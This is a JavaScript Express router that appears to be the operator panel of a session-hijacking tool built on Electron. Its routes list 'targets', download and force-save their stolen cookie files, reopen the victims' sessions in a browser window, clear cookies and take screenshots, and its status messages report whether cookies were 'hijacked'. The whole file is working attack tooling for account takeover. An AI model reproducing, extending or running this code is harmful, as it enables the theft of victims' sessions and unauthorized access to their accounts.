const { BrowserWindow, screen, session } = require("electron")
const { getAppUrl } = require('../spikes/ApplicationConfig')
const browserManager = require("../spikes/browserManager")
const { cout } = require('../utils/server-helpers')
const { targetDB } = require('../utils/DB')
const express = require('express')
const path = require("path")
const fs = require("fs")

const router = express.Router()

router.route("/").get((req, res) => {
    const { id } = req.query

    if (!targetDB.info().collections.includes(id)) {
        res.send("target not found")
        return
    }

    const targetCollection = targetDB.collection(id, false)
    res.render("panel", {
        data: targetCollection.find({})
    })
})

router.route("/response").post((req, res) => {
    try {
        const { id } = req.query
        const { data } = req.body
        if (!targetDB.info().collections.includes(id)) {
            res.send("target not found")
            return
        }

        const targetCollection = targetDB.collection(id, false)
        targetCollection.update({}, { response: data })
        res.send("OK")
    } catch (error) {
        res.send(error.message)
    }
})

router.route("/database").get((req, res) => {
    try {
        const { id } = req.query

        if (!targetDB.info().collections.includes(id)) {
            res.send("target not found")
            return
        }

        const targetCollection = targetDB.collection(id, false)
        res.send(targetCollection.find({}).data)
    } catch (error) {
        res.send(error.message)
    }
})

router.route("/browser").get(async (req, res) => {
    try {
        if (process.argv.includes('--headless')) {
            res.send("openbrowser is error, because app running on headless mode.")
            return
        }

        const { id, appName } = req.query
        const cookiesFilePath = path.join(process.__dirname, "ssd", "cookies", `${id}.wszip`)

        if (fs.existsSync(cookiesFilePath)) {
            const url = getAppUrl(appName, "desktop")
            const presistedSession = session.fromPartition(`persist:tab-${id}`)

            const newtab = new BrowserWindow({
                width: 920,
                height: screen.getPrimaryDisplay().size.height,
                show: !process.argv.includes('--headless'),
                webPreferences: {
                    session: presistedSession
                }
            })

            await newtab.loadURL(url)
            res.send('OK')
            return
        }

        res.send("cookie not hijacked")
    } catch (error) {
        res.send(error.message)
    }
})

router.route("/download-cookies").get((req, res) => {
    const { id } = req.query
    const cookiesFilePath = path.join(process.__dirname, "ssd", "cookies", `${id}.wszip`)

    res.sendFile(cookiesFilePath, (err) => {
        if (err) res.send("cookies not hijacked.")
    })
})

router.route("/force-cookies").get(async (req, res) => {
    const { id, appName } = req.query
    const url = getAppUrl(appName, "desktop")

    const result = await browserManager.saveCookies(id, url)
    if (result) {
        if (process.argv.includes('--headless')) {
            const tab = browserManager.tabs[id]
            if (tab) {
                tab.close()
                delete browserManager.tabs[id]
            }
        }

        res.send("cookies saved.")
    } else {
        res.send("error while saving cookies.")
    }
})

router.route("/clear-cookies").get((req, res) => {
    const { id } = req.query
    if (!targetDB.info().collections.includes(id)) {
        res.send("target not found")
        return
    }

    try {
        const cookiesFilePath = path.join(process.__dirname, "ssd", "cookies", `${id}.wszip`)
        if (fs.existsSync(cookiesFilePath)) {
            fs.rmSync(cookiesFilePath, { recursive: true })

            const targetCollection = targetDB.collection(id, false)
            targetCollection.update({}, { cookies: "pending" })

            res.send("cookies cleared")
        } else {
            res.send("cookies not hijacked.")
        }
    } catch (error) {
        cout.err(error)
        res.send(error.message)
    }
})

router.get("/take-screenshot", async (req, res) => {
    const { id } = req.query
    const tab = browserManager.tabs[id]

    if (tab) {
        try {
            let img = await tab.webContents.capturePage()
            res.send(img.toDataURL())
        } catch (error) {
            res.send("ERROR")
        }
        return
    }

    res.send("browser not found.")
})

module.exports = router